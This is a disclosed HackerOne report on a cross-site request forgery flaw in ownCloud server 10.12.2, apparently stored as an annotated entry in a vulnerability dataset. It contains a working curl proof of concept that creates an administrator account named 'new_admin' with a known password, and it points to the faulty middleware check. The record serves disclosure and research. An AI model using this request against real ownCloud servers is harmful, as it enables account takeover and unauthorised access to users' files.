{
  "reported_to": "ownCloud",
  "reported_by": "pascal_geuter ",
  "title": "Cross-Site Request Forgery ",
  "content": "\nThe application does not throw a CrossSiteRequestForgeryException, if the request does not contain the requesttoken header.\nSteps to reproduce\nrun the docker image \"owncloud/server:10.12.2\" , redis and mariadb with docker-compose\nlog in the application as an admin user\ninsert your cookies in\nCode 394 Bytes\n1curl 'http://localhost:8080/settings/users/users' \\\n2  -H 'Accept: */*' \\\n3  -H 'Connection: keep-alive' \\\n4  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\\n5  -H 'Cookie: oc_sessionPassphrase=<placeholder1>; oclt1tejv3yd=<placeholder2>' \\\n6  -H 'Origin: http://abc:8080' \\\n7  --data-raw 'username=new_admin&groups%5B%5D=admin&password=a&email=test%40mail.com' \\\n8  --compressed\nand run it.\nLogin in the application with the username new_admin and the passwort a\nTo add an admin user is only an example. Most if not all requests does not require an CSRF token.\nI think the cause of this vulnerability is the second condition of https://github.com/owncloud/core/blob/master/lib/private/AppFramework/Middleware/Security/SecurityMiddleware.php#L145, because the the value of $this->request->getHeader(\"Authorization\") is an empty string and not null, if there are no Authorization header.\nImpact\nUnder the requirement, that the sameSite value of the cookies are set to lax or none, an attacker can create a website and if the victim surfs to this website cross site requests with the cookies of the victim are possible. Depending on the role/groups of the victim, the attacker can create an admin account with known username and passwort or share files with an other (possible attacker controlled) user and possible other actions.\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-Site Request Forgery (CSRF)"
  ],
  "screenshots": {},
  "disclosed_date": 1699193760,
  "report_url": "https://hackerone.com/reports/2041007",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Run the docker image 'owncloud/server:10.12.2', redis and mariadb with docker-compose"
    ],
    [
      2,
      "Log in the application as an admin user"
    ],
    [
      3,
      "Insert your cookies in the provided curl command and execute it"
    ],
    [
      4,
      "Login in the application with the username 'new_admin' and the password 'a'"
    ]
  ],
  "vuln_description": "The application does not validate the presence of a CSRF token in requests, allowing attackers to perform actions on behalf of authenticated users if they can trick the user into visiting a malicious website. This can lead to unauthorized actions such as creating admin accounts or sharing files.",
  "reason": "The vulnerability involves understanding CSRF mechanisms and cookie handling, but the attack itself is straightforward once the lack of CSRF token validation is identified. The main complexity comes from needing to set up the environment and crafting the request, but the core issue is not subtle or novel.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}